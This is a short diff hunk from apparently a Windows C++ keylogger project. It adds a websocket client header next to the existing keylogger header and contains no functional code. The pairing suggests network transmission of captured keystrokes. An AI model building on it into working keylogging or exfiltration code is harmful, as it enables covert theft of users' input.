@@ -1,4 +1,5 @@
 #include "keylogger.hpp"
+#include "websocket_client.hpp"
 #include <windows.h>
 #include <thread>
 #include <atomic>
